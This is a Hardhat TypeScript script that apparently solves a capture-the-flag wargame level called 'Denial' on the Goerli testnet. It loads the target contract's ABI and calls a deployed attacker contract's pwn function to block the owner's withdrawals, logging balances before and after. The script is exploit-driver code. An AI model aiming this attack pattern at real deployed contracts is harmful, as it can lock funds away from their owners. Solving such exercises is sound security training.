import { ethers } from "hardhat"

const provider = new ethers.providers.JsonRpcProvider(
  process.env.GOERLI_RPC_URL
)

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x1a29900755e173d817E5C6640a8C0a7651EDA886"
  const targetAbi = [
    {
      inputs: [],
      name: "contractBalance",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x8b7afe2e",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [
        {
          internalType: "address payable",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x8da5cb5b",
    },
    {
      inputs: [],
      name: "partner",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xbe10862b",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "_partner",
          type: "address",
        },
      ],
      name: "setWithdrawPartner",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x4e1c5914",
    },
    {
      inputs: [],
      name: "withdraw",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x3ccfd60b",
    },
    {
      stateMutability: "payable",
      type: "receive",
      payable: true,
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("Denial")

  const ownerAddress = await target.owner()
  console.log("owner address", ownerAddress)
  console.log(
    "owner balance",
    (await provider.getBalance(ownerAddress)).toString()
  )
  console.log(
    "contract balance",
    (await provider.getBalance(contract.address)).toString()
  )

  const tx = await contract.pwn(targetAddress, { gasLimit: 1000000 })

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://goerli.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://goerli.etherscan.io/tx/${error?.transactionHash}`
    )
  }

  console.log(
    "owner balance",
    (await provider.getBalance(ownerAddress)).toString()
  )
  console.log(
    "contract balance",
    (await provider.getBalance(contract.address)).toString()
  )
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
